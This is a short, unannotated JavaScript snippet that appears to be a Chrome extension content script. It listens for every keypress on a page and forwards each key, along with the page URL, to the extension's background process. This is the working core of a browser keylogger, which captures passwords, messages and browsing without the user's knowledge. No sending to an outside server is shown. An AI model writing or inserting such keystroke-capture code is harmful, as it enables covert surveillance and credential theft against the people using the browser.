document.addEventListener("keydown", function(event) {
  chrome.runtime.sendMessage({ type: "keystroke", data: event.key });
});

chrome.runtime.sendMessage({ type: "site", data: location.href });
